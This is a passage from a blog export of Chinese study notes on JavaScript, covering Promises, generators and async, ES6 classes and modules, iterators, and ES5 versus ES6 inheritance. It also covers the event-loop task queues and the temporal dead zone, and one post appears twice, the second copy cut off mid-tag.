color="#228B22">首先介绍Promise，然后介绍ES6提供的生成器函数，async函数</font>。<br>Promise来源于社区，代表一个对象，它代表异步操作未来的一个结果（承诺）。它总共有三个状态，pending\fulfilled\rejected。另外，它的状态翻转路径只有两个：pending-&gt;fulfilled or pending-&gt;rejected，一旦状态翻转，就不可变了。它支持链式调用，支持错误传递，支持以同步代码的方式写异步操作。</p><p>Promise是一个对象，创建此对象实例的方法如下（可以理解resolve和reject是已返回的承诺对象未来回调函数的占位）</p><p>Generator函数是ES6提供的异步编程解决方案。对于Generator函数，可以将它理解为一个状态机，封装了多个内部状态；此外它还是一个遍历器生成函数，这个函数可以遍历出状态机的所有状态。</p><p>函数特征：关键字function与函数名之间有*，函数体内部yeild关键字。</p><p>生成器函数与普通函数的区别：<strong>函数调用后不执行，而是返回一个指针对象（遍历器对象）</strong>。调用对象的next()方法，执行一段yield逻辑。故函数的分段执行的，yield是暂停执行的标志，next()可以恢复执行。</p><p>yield与return的区别：<strong>yield有记忆功能</strong>，return没有；一个函数可以多次执行yeild，但只会return一次</p><p><font color="#FF00FF">async函数是Generator函数的语法糖，它进行了改进：1.自带执行器；2.返回值是Promise;</font></p><p><font color="#FF8C00">三家对比：使用Promise的异步代码存在大量自有API的调用，操作本身的语义夹杂其中，不是很清晰；Generator函数实现的异步代码语义比Promise清晰，但需要一个执行器；async函数的写法最简洁、符合语义，不需要执行器。</font></p><h2 id="语言层面类、模块的支持"><a href="#语言层面类、模块的支持" class="headerlink" title="语言层面类、模块的支持"></a>语言层面类、模块的支持</h2><h3 id="class"><a href="#class" class="headerlink" title="class"></a>class</h3><p>从 ES6 开始，JavaScript 提供了 class 关键字来定义类，尽管，这样的方案仍然是<strong>基于原型</strong>运行时系统的模拟，大部分功能ES5可以实现。</p><p>构造函数的prototype属性在 ES6 的“类”上面继续存在。事实上，类中所有方法都定义在类的prototype属性上面（因而也是不可枚举的）。</p><p>constructor方法是类的默认方法，通过new命令生成对象实例时，自动调用该方法。一个类必须有constructor方法，如果没有显式定义，一个空的constructor方法会被默认添加。（默认构造函数）；constructor方法默认返回实例对象（即this），完全可以指定返回另外一个对象。</p><p>注意区别：<font color="#FF00FF">类必须使用new调用，否则会报错。这是它跟普通构造函数的一个主要区别，后者不用new也可以执行。</font></p><p>类相当于实例的原型，所有在类中定义的方法，都会被实例继承。<font color="#FF00FF">如果在一个方法前，加上static关键字，就表示该方法不会被实例继承，而是直接通过类来调用，这就称为“静态方法”。</font></p><p>实例属性除了定义在constructor()方法里面的this上面，也可以定义在类的最顶层。</p><ul><li>私有属性和方法如何实现？1.命名上加以区别 2.将私有方法移出模块，利用公有方法调用；3.Symbol属性上（都不完美）<h3 id="module"><a href="#module" class="headerlink" title="module"></a>module</h3>在 ES6 之前，社区制定了一些模块加载方案，最主要的有 CommonJS 和 AMD 两种。前者用于服务器，后者用于浏览器。ES6 模块的设计思想是尽量的静态化，使得<font color="#FF00FF">编译时就能确定模块的依赖关系</font>，以及输入和输出的变量。CommonJS 和 AMD 模块，都只能在<font color="#FF00FF">运行时确定。</font></li></ul><p><strong>编译时加载VS运行时加载——对象VS代码</strong></p><p>模块命令：export和import；一个文件即为一个模块，除非导入否则外部无法读取模块属性；</p><p>export支持：变量、函数和类</p><p>export命令可以出现在模块的任何位置，只要处于模块顶层就可以。如果处于块级作用域内，就会报错，下一节的import命令也是如此。</p><p>输入的变量都是<font color="#FF8C00">只读</font>的，因为它的本质是输入接口。也就是说，不允许在加载模块的脚本里面，改写接口。由于import是<font color="#FF8C00">静态执行</font>，所以不能使用表达式和变量，这些只有在运行时才能得到结果的语法结构。</p><p>使用import命令的时候，<font color="#FF8C00">用户需要知道所要加载的变量名或函数名，否则无法加载</font>。但是，用户肯定希望快速上手，未必愿意阅读文档，去了解模块有哪些属性和方法。<font color="#FF00FF">为了给用户提供方便，让他们不用阅读文档就能加载模块，就要用到export default命令，为模块指定默认输出</font>。<br><font color="#FF00FF">模块之间也可以继承</font>。</p><h2 id="JS中对象分类、及其它原生对象"><a href="#JS中对象分类、及其它原生对象" class="headerlink" title="JS中对象分类、及其它原生对象"></a>JS中对象分类、及其它原生对象</h2><p><img src="http://files.shanqianche.cn/20228/1659517395135.png" alt="JS对象"></p><h2 id="Iterator"><a href="#Iterator" class="headerlink" title="Iterator"></a>Iterator</h2><p>ES6之前在JS中只有Array和对象可以表示“集合”这种数据结构，ES6中增加了 <strong>：Set和Map</strong>。由此，四种之间互相组合又可以定义新的数据结构。<strong>这些新定义的数据结构如何访问呢？遍历器（Iterator）就是这样一种机制</strong>。它是一种接口，为各种不同的数据结构提供统一的访问机制。<strong>任何数据结构只要部署 Iterator 接口，就可以完成遍历操作。<font color="#FF00FF">遍历器对象本质上是一个指针对象</font>。</strong></p><p>只要为某个数据结构部署了Iterator接口，则可以称此数据结构是可遍历的。iterator属性部署在Symbol上。如下对象默认部署了Iterator结口：Array Set Map String等。部署iterator结构的要点：<strong>1）在Symbol.iterator上部署；2）必须包含next()函数。默认调用iterator接口的场景：解构赋值、…扩展运算符、yeild</strong>* 。<font color="#FF8C00">for-of循环内部调用的即是调用数据机构内部的Symbol.iterator方法。</font></p><ul><li>for-in和for-of循环</li></ul><p>for-in用于遍历对象<font color="#FF8C00">属性</font>，对象自身和<font color="#FF8C00">继承</font>的可枚举属性（不可遍历Symbol属性）<br>for-of循环是一种遍历所有数据机构的<font color="#FF8C00">统一方法</font>。实现原理是数据结构上部署的Symbol.iterator属性。</p><h1 id="ES6-与-ES5-继承的区别"><a href="#ES6-与-ES5-继承的区别" class="headerlink" title="ES6 与 ES5 继承的区别"></a>ES6 与 ES5 继承的区别</h1><p>ES6 中有类 class 的概念，类 class 的继承是通过 extends 来实现的，ES5 中是<strong>通过设置构造函数的 prototype 属性</strong>，来实现继承的。</p><p>ES6 与 ES5 中的继承有 2 个区别，<font color="#FF8C00">第一个是，ES6 中子类会继承父类的属性</font>，<strong>第二个区别是，super() 与 A.call(this) 是不同的，在继承原生构造函数的情况下，体现得很明显，ES6 中的子类实例可以继承原生构造函数实例的<font color="#FF00FF">内部属性</font>，而在 ES5 中做不到。</strong></p><p><strong><font color="#228B22">下面通过 3 个 demo，来分析它们之间的区别。</font></strong></p><h2 id="ES5-继承"><a href="#ES5-继承" class="headerlink" title="ES5 继承"></a>ES5 继承</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">function A() &#123;</span><br><span class="line">  this.a = &#x27;hello&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function B() &#123;</span><br><span class="line">  A.call(this);</span><br><span class="line">  this.b = &#x27;world&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">B.prototype = Object.create(A.prototype, &#123;</span><br><span class="line">  constructor: &#123; value: B, writable: true, configurable: true &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">let b = new B();</span><br></pre></td></tr></table></figure><p>代码中，构造函数 B 继承构造函数 A，<font color="#FF00FF">首先让构造函数 B 的 prototype 对象中的 proto 属性指向构造函数 A 的 prototype 对象</font>，并且<font color="#FF00FF">将构造函数 B 的 prototype 对象的 constructor 属性赋值为构造函数 B</font>，让构造函数 B 的实例继承构造函数 A 的原型对象上的属性，然后<font color="#FF00FF">在构造函数 B 内部的首行写上 A.call(this)，让构造函数 B 的实例继承构造函数 A 的实例属性</font>。在 ES5 中实现两个构造函数之间的继承，只需要做这两步即可【首先获取共享对象，其次继承上下文】。下面六幅图分别是，实例 b 的原型链及验证图，构造函数 B 的原型链及验证图，构造函数 A 的原型链及验证图。</p><p><img src="http://files.shanqianche.cn/20228/1659518038924.png" alt="实例 b 的原型链"><br><img src="https://files.shanqianche.cn/20228/1659530355038.png" alt="实例 b 的原型链验证图"></p><p><img src="https://files.shanqianche.cn/20228/1659530491136.png" alt="构造函数 B 的原型链图"></p><p><img src="https://files.shanqianche.cn/20228/1659530566896.png" alt="构造函数 A 的原型链图"></p><p><img src="https://files.shanqianche.cn/20228/1659530596049.png" alt="构造函数 B 的原型链"></p><p>从上面 6 幅图可知，构造函数 B 的实例 b 继承了构造函数 A 的实例属性，继承了构造函数 A 的原型对象上的属性，继承了构造函数 Object 的原型对象上的属性。<font color="#FF00FF">构造函数 B 是构造函数 Function 的实例，继承了构造函数 Function 的原型对象上的属性，继承了构造函数 Object 的原型对象上的属性。</font> 构造函数 A 是构造函数 Function 的实例，继承了构造函数 Function 的原型对象上的属性，继承了构造函数 Object 的原型对象上的属性。可看出，<font color="#FF00FF">构造函数 A 与 构造函数 B 并没有继承关系，即构造函数 B 没有继承构造函数 A 上面的属性</font>，在 ES6 中，用 extends 实现两个类的继承，两个类之间是有继承关系的，即子类继承了父类的方法，这是 ES6 与 ES5 继承的<font color="#9932CC">第一点区别</font>，下面通过 ES6 的继承来说明这一点。</p><h2 id="ES6-继承"><a href="#ES6-继承" class="headerlink" title="ES6 继承"></a>ES6 继承</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">class A &#123;</span><br><span class="line">  constructor() &#123;</span><br><span class="line">    this.a = &#x27;hello&#x27;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class B extends A &#123;</span><br><span class="line">  constructor() &#123;</span><br><span class="line">    super();</span><br><span class="line">    this.b = &#x27;world&#x27;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">let b = new B();</span><br></pre></td></tr></table></figure><p>代码中，类 B 通过 extends 关键字继承类 A 的属性及其原型对象上的属性，通过在类 B 的 constructor 函数中执行 super() 函数，让类 B 的实例继承类 A 的实例属性，<font color="#FF00FF">super() 的作用类似构造函数 B 中的 A.call(this)，但它们是有区别的</font>，这是 ES6 与 ES5 继承的<font color="#9932CC">第二点区别</font>，这个区别会在文章的最后说明。在 ES6 中，两个类之间的继承就是通过 extends 和 super 两个关键字实现的。下面四幅图分别是，实例 b 的原型链及验证图，类 B 的原型链及验证图。</p><p><img src="https://files.shanqianche.cn/20228/1659530993293.png" alt="实例 b 的原型链"></p><p><img src="https://files.shanqianche.cn/20228/1659531008381.png" alt="实例 b 的原型链验证图"></p><p><img src="https://files.shanqianche.cn/20228/1659531025414.png" alt="类 B 的原型链图"></p><p><img src="https://files.shanqianche.cn/20228/1659531049372.png" alt="类 B 的原型链验证图"><br>通过上面 4 幅图可知，在 ES6 与 ES5 中，<font color="#FF8C00">类 B 的实例 b 的原型链与构造函数 B 的实例 b 的原型链是相同的，但是在 ES6 中类 B 继承了类 A 的属性，在 ES5 中，构造函数 B 没有继承构造函数 A 的属性，这是 ES6 与 ES5 继承的第一个区别。</font></p><p><strong>super() 与 A.call(this) 的区别</strong><br>在 ES5 中，构造函数 B 的实例继承构造函数 A 的实例属性是<strong>通过 A.call(this) 来实现</strong>的，在 ES6 中，类 B 的实例继承类 A 的实例属性，是<strong>通过 super() 实现</strong>的。<strong>在不是继承原生构造函数的情况下，A.call(this) 与 super() 在功能上是没有区别的</strong>，用 babel 在线转换 将类的继承转换成 ES5 语法，babel 也是通过 A.call(this) 来模拟实现 super() 的。<strong>但是在继承原生构造函数的情况下，A.call(this) 与 super() 在功能上是有区别的</strong>，<font color="#FF00FF">ES5 中 A.call(this) 中的 this 是构造函数 B 的实例，也就是在实现实例属性继承上，ES5 是先创造构造函数 B 的实例，然后在让这个实例通过 A.call(this) 实现实例属性继承，在 ES6 中，是先新建父类的实例对象this，然后再用子类的构造函数修饰 this，使得父类的所有行为都可以继承</font>。下面通过 2 段代码说明这个问题。</p><p><img src="https://files.shanqianche.cn/20228/1659531285963.png" alt="代码一"><br>这段代码的思路就是，<strong>让构造函数 MyArray 继承原生构造函数 Array，然后验证 MyArray 的实例是否具有 Array 实例的特性。</strong><br>从结果可以看出，MyArray 的实例并不具有 Array 实例的特性，之所以会发生这种情况，是<strong>因为 MyArray 的实例无法获得原生构造函数 Array 实例的内部属性</strong>，通过 Array.call(this) 也不行。</p><p><img src="https://files.shanqianche.cn/20228/1659531384336.png" alt="代码二"><br>从结果可以看出，通过 super()，MyArray 的实例具有 Array 实例的特性。</p><h1 id="哪些类型能被扩展操作符…扩展"><a href="#哪些类型能被扩展操作符…扩展" class="headerlink" title="哪些类型能被扩展操作符…扩展"></a>哪些类型能被扩展操作符…扩展</h1>]]></content>
      
      
      <categories>
          
          <category> plan </category>
          
      </categories>
      
      
        <tags>
            
            <tag> graduate student </tag>
            
            <tag> study </tag>
            
            <tag> plan </tag>
            
            <tag> daily/weekly </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JS工作原理(第七天)</title>
      <link href="/2022/08/03/JS%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86(%E7%AC%AC%E4%B8%83%E5%A4%A9)-DESKTOP-GBOPJPV/"/>
      <url>/2022/08/03/JS%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86(%E7%AC%AC%E4%B8%83%E5%A4%A9)-DESKTOP-GBOPJPV/</url>
      
        <content type="html"><![CDATA[<h1 id="为什么js是单线程"><a href="#为什么js是单线程" class="headerlink" title="为什么js是单线程"></a>为什么js是单线程</h1><p>这主要和js的用途有关，js是作为浏览器的脚本语言，主要是实现用户与浏览器的交互，以及操作dom；这决定了它只能是单线程，否则会带来很复杂的同步问题。 <strong>举个例子：如果js被设计了多线程，如果有一个线程要修改一个dom元素，另一个线程要删除这个dom元素，此时浏览器就会一脸茫然，不知所措。</strong> 所以，为了避免复杂性，从一诞生，JavaScript就是单线程，这已经成了这门语言的核心特征，将来也不会改变</p><p><font color="#FF8C00">扩展：</font></p><p>什么是进程？<br>进程：是<font color="#FF8C00">cpu分配资源的最小单位</font>；（<font color="#FF8C00">是能拥有资源和独立运行的最小单位</font>）</p><p>什么是线程？<br>线程：<font color="#FF8C00">是cpu调度的最小单位；（线程是建立在进程的基础上的一次程序运行单位，一个进程中可以有多个线程</font>）</p><p>浏览器是多进程的？<br>放在浏览器中，<font color="#FF8C00">每打开一个tab页面，其实就是新开了一个进程，在这个进程中，还有ui渲染线程，js引擎线程，http请求线程等。 所以，浏览器是一个多进程的。</font></p><p><font color="#FF00FF">为了利用多核CPU的计算能力，HTML5提出Web Worker标准，允许JavaScript脚本创建多个线程，但是子线程完全受主线程控制，且不得操作DOM。所以，这个新标准并没有改变JavaScript单线程的本质</font>。</p><h1 id="宏微队列及执行顺序"><a href="#宏微队列及执行顺序" class="headerlink" title="宏微队列及执行顺序"></a>宏微队列及执行顺序</h1><p>JS 中用来存储待执行回调函数的队列包含 2 个不同特定的列队</p><ul><li>宏列队：用来保存待执行的宏任务（回调），比如：定时器回调、DOM 事件回调、ajax 回调</li><li>微列队：用来保存待执行的微任务（回调），比如：promise的回调、MutationObserver 的回调</li></ul><p>JS 执行时会区别这 2 个队列</p><ul><li>JS 引擎首先必须先执行所有的初始化同步任务代码</li><li><font color="#FF8C00">每次准备取出第一个宏任务执行前, 都要将所有的微任务一个一个取出来执行，也就是优先级比宏任务高，且与微任务所处的代码位置无关</font></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">setTimeout(() =&gt; &#123; //立即放入宏队列</span><br><span class="line">      console.log(&#x27;timeout callback1（）&#x27;)</span><br><span class="line">      Promise.resolve(3).then(</span><br><span class="line">        value =&gt; &#123; //立即放入微队列</span><br><span class="line">          console.log(&#x27;Promise onResolved3()&#x27;, value)</span><br><span class="line">        &#125;</span><br><span class="line">      )</span><br><span class="line">    &#125;, 0)</span><br><span class="line"></span><br><span class="line">    setTimeout(() =&gt; &#123; //立即放入宏队列</span><br><span class="line">      console.log(&#x27;timeout callback2（）&#x27;)</span><br><span class="line">    &#125;, 0)</span><br><span class="line"></span><br><span class="line">    Promise.resolve(1).then(</span><br><span class="line">      value =&gt; &#123; //立即放入微队列</span><br><span class="line">        console.log(&#x27;Promise onResolved1()&#x27;, value)</span><br><span class="line">        setTimeout(() =&gt; &#123;</span><br><span class="line">          console.log(&#x27;timeout callback3（）&#x27;, value)</span><br><span class="line">        &#125;, 0)</span><br><span class="line">      &#125;</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    Promise.resolve(2).then(</span><br><span class="line">      value =&gt; &#123; //立即放入微队列</span><br><span class="line">        console.log(&#x27;Promise onResolved2()&#x27;, value)</span><br><span class="line">      &#125;</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    // Promise onResolved1() 1</span><br><span class="line">    // Promise onResolved2() 2</span><br><span class="line">    // timeout callback1（）</span><br><span class="line">    // Promise onResolved3() 3</span><br><span class="line">    // timeout callback2（）</span><br><span class="line">    // timeout callback3（） 1</span><br></pre></td></tr></table></figure><h1 id="死锁"><a href="#死锁" class="headerlink" title="死锁"></a>死锁</h1><p><font color="#FF8C00">死锁是指两个或两个以上的进程在执行过程中，由于竞争资源而造成阻塞的现象，若无外力作用，它们都将无法继续执行</font></p><p><strong>产生原因</strong></p><ul><li>竞争资源引起进程死锁</li><li>可剥夺和非剥夺资源</li><li>竞争非剥夺资源</li><li>竞争临时性资源</li><li>进程推进顺序不当</li><li></li></ul><p><strong>产生条件</strong></p><ol><li>互斥条件：涉及的资源是非共享的<ul><li>涉及的资源是非共享的,一段时间内某资源只由一个进程占用,如果此时还有其它进程请求资源，则请求者只能等待，直至占有资源的进程用毕释放</li></ul></li><li>不剥夺条件：不能强行剥夺进程拥有的资源<ul><li>进程已获得的资源，在未使用完之前，不能被剥夺，只能在使用完时由自己释放</li></ul></li><li>请求和保持条件：进程在等待一新资源时继续占有已分配的资源<ul><li>指进程已经保持至少一个资源，但又提出了新的资源请求，而该资源已被其它进程占有，此时请求进程阻塞，但又对自己已获得的其它资源保持不放</li></ul></li><li>环路等待条件：存在一种进程的循环链，链中的每一个进程已获得的资源同时被链中的下一个进程所请求 在发生死锁时，必然存在一个进程——资源的环形链</li></ol><p><font color="#FF00FF">解决办法</font><br>只要打破四个必要条件之一就能有效预防死锁的发生</p><h1 id="暂时性死区"><a href="#暂时性死区" class="headerlink" title="暂时性死区"></a>暂时性死区</h1><p>暂时性死区的本质就是，<font color="#FF00FF">只要一进入当前作用域，所要使用的变量就已经存在了，但是不可获取，只有等到声明变量的那一行代码出现，才可以获取和使用该变量</font>。<br><strong>扩展：</strong><br>let 、const与暂时性死区</p><p>let或const声明的变量拥有暂时性死区（TDZ）：当进入它的作用域，它不能被访问（获取或设置）直到执行到达声明。</p><p>首先看看<font color="#FF8C00">不具有</font>暂时性死区的var：</p><ul><li>当进入var变量的作用域（包围它的函数）<strong>，立即为它创建（绑定）存储空间。变量会立即<font color="#FF00FF">被初始化并赋值</font>为undefined。</strong></li><li>当执行到变量声明的时候，如果变量定义了值则会被赋值。</li></ul><p>通过let声明的变量拥有暂时性死区，生命周期如下：</p><ul><li>当进入let变量的作用域（包围它的语法块），立即为它创建（绑定）存储空间。此时变量仍是<font color="#FF00FF">未初始化</font>的。</li><li>获取或设置未初始化的变量将抛出异常ReferenceError。</li><li>当执行到变量声明的时候，如果变量定义了值则会被赋值。如果没有定义值，则赋值为undefined。</li><li>const工作方式与let类似，但是**<font color="#FF8C00">定义的时候必须赋值并且不能改变。</font>**</li></ul><blockquote><p>在 TDZ 内部，如果获取或设置变量将抛出异常：</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">if (true) &#123; // enter new scope, TDZ starts</span><br><span class="line">    // Uninitialized binding for `tmp` is created</span><br><span class="line"></span><br><span class="line">    tmp = &#x27;abc&#x27;; // ReferenceError</span><br><span class="line">    console.log(tmp); // ReferenceError</span><br><span class="line"></span><br><span class="line">    let tmp; // TDZ ends, `tmp` is initialized with `undefined`</span><br><span class="line">    console.log(tmp); // undefined</span><br><span class="line"></span><br><span class="line">    tmp = 123;</span><br><span class="line">    console.log(tmp); // 123</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面的示例将演示死区（dead zone）是<font color="#FF00FF">真正短暂的（基于时间）和不受空间条件限制（基于位置）</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">if (true) &#123; // enter new scope, TDZ starts</span><br><span class="line">    const func = function () &#123;</span><br><span class="line">        console.log(myVar); // OK!</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    // Here we are within the TDZ and</span><br><span class="line">    // accessing `myVar` would cause a `ReferenceError`</span><br><span class="line"></span><br><span class="line">    let myVar = 3; // TDZ ends</span><br><span class="line">    func(); // called outside TDZ</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>typeof与暂时性死区，变量在暂时性死区无法被访问，所以无法对它使用typeof：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if (true) &#123;</span><br><span class="line">    console.log(typeof tmp); // ReferenceError</span><br><span class="line">    let tmp;</span><br><span class="line">&#125;s</span><br></pre></td></tr></table></figure><h1 id="面向对象的三个特征，分别说一下什么意思"><a href="#面向对象的三个特征，分别说一下什么意思" class="headerlink" title="面向对象的三个特征，分别说一下什么意思"></a>面向对象的三个特征，分别说一下什么意思</h1><p><strong>封装：</strong> 将对象运行所需的资源封装在程序对象中——基本上，是方法和数据。对象是“公布其接口”。其他附加到这些接口上的对象不需要关心对象实现的方法即可使用这个对象。这个概念就是“不要告诉我你是怎么做的，只要做就可以了。”对象可以看作是一个自我包含的原子。<font color="#FF8C00">对象接口包括了公共的方法和初始化数据。</font></p><p><strong>继承：</strong> 继承可以解决代码复用，让编程更加靠近人类思维。当多个类存在相同的属性(变量)和方法时，可以从这些类中抽象出父类，在父类中定义这些相同的属性和方法，所有的子类不需要重新定义这些属性和方法，只需要通过继承父类中的属性和方法。</p><p><strong>多态：</strong> 多态是指一个引用(类型)在不同情况下的多种状态。也可以理解成：<font color="#FF00FF">多态是指通过指向父类的引用，来调用在不同子类中实现的方法</font>。</p><p><font color="#FF8C00">特点：</font></p><ul><li>封装可以隐藏实现细节，使得代码模块化；</li><li>继承可以扩展已存在的代码模块（类），它们的目的都是为了——代码重用。</li><li>多态就是<font color="#FF00FF">相同的事物，调用其相同的方法，参数也相同时，但表现的行为却不同。多态分为两种，一种是行为多态与对象的多态</font></li></ul>]]></content>
      
      
      <categories>
          
          <category> plan </category>
          
      </categories>
      
      
        <tags>
            
            <tag> graduate student </tag>
            
            <tag> study </tag>
            
            <tag> plan </tag>
            
            <tag> daily/weekly </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JS工作原理(第七天)</title>
      <link href="/2022/08/03/JS%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86(%E7%AC%AC%E4%B8%83%E5%A4%A9)/"/>
      <url>/2022/08/03/JS%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86(%E7%AC%AC%E4%B8%83%E5%A4%A9)/</url>
      
        <content type="html"><![CDATA[<h1 id="为什么js是单线程"><a href="#为什么js是单线程" class="headerlink" title="为什么js是单线程"></a>为什么js是单线程</h1><p>这主要和js的用途有关，js是作为浏览器的脚本语言，主要是实现用户与浏览器的交互，以及操作dom；这决定了它只能是单线程，否则会带来很复杂的同步问题。 <strong>举个例子：如果js被设计了多线程，如果有一个线程要修改一个dom元素，另一个线程要删除这个dom元素，此时浏览器就会一脸茫然，不知所措。</strong> 所以，为了避免复杂性，从一诞生，JavaScript就是单线程，这已经成了这门语言的核心特征，将来也不会改变</p><p><font color="#FF8C00">扩展：</font></p><p>什么是进程？<br>进程：是<font color="#FF8C00">cpu分配资源的最小单位</font>；（<font color="#FF8C00">是能拥有资源和独立运行的最小单位</font>）</p><p>什么是线程？<br>线程：<font color="#FF8C00">是cpu调度的最小单位；（线程是建立在进程的基础上的一次程序运行单位，一个进程中可以有多个线程</font>）</p><p>浏览器是多进程的？<br>放在浏览器中，<font color="#FF8C00">每打开一个tab页面，其实就是新开了一个进程，在这个进程中，还有ui渲染线程，js引擎线程，http请求线程等。 所以，浏览器是一个多进程的。</font></p><p><font color="#FF00FF">为了利用多核CPU的计算能力，HTML5提出Web Worker标准，允许JavaScript脚本创建多个线程，但是子线程完全受主线程控制，且不得操作DOM。所以，这个新标准并没有改变JavaScript单线程的本质</font>。</p><h1 id="宏微队列及执行顺序"><a href="#宏微队列及执行顺序" class="headerlink" title="宏微队列及执行顺序"></a>宏微队列及执行顺序</h1><p>JS 中用来存储待执行回调函数的队列包含 2 个不同特定的列队</p><ul><li>宏列队：用来保存待执行的宏任务（回调），比如：定时器回调、DOM 事件回调、ajax 回调</li><li>微列队：用来保存待执行的微任务（回调），比如：promise的回调、MutationObserver 的回调</li></ul><p>JS 执行时会区别这 2 个队列</p><ul><li>JS 引擎首先必须先执行所有的初始化同步任务代码</li><li><font color="#FF8C00">每次准备取出第一个宏任务执行前, 都要将所有的微任务一个一个取出来执行，也就是优先级比宏任务高，且与微任务所处的代码位置无关</font></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">setTimeout(() =&gt; &#123; //立即放入宏队列</span><br><span class="line">      console.log(&#x27;timeout callback1（）&#x27;)</span><br><span class="line">      Promise.resolve(3).then(</span><br><span class="line">        value =&gt; &#123; //立即放入微队列</span><br><span class="line">          console.log(&#x27;Promise onResolved3()&#x27;, value)</span><br><span class="line">        &#125;</span><br><span class="line">      )</span><br><span class="line">    &#125;, 0)</span><br><span class="line"></span><br><span class="line">    setTimeout(() =&gt; &#123; //立即放入宏队列</span><br><span class="line">      console.log(&#x27;timeout callback2（）&#x27;)</span><br><span class="line">    &#125;, 0)</span><br><span class="line"></span><br><span class="line">    Promise.resolve(1).then(</span><br><span class="line">      value =&gt; &#123; //立即放入微队列</span><br><span class="line">        console.log(&#x27;Promise onResolved1()&#x27;, value)</span><br><span class="line">        setTimeout(() =&gt; &#123;</span><br><span class="line">          console.log(&#x27;timeout callback3（）&#x27;, value)</span><br><span class="line">        &#125;, 0)</span><br><span class="line">      &#125;</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    Promise.resolve(2).then(</span><br><span class="line">      value =&gt; &#123; //立即放入微队列</span><br><span class="line">        console.log(&#x27;Promise onResolved2()&#x27;, value)</span><br><span class="line">      &#125;</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    // Promise onResolved1() 1</span><br><span class="line">    // Promise onResolved2() 2</span><br><span class="line">    // timeout callback1（）</span><br><span class="line">    // Promise onResolved3() 3</span><br><span class="line">    // timeout callback2（）</span><br><span class="line">    // timeout callback3（） 1</span><br></pre></td></tr></table></figure><h1 id="死锁"><a href="#死锁" class="headerlink" title="死锁"></a>死锁</h1><p><font 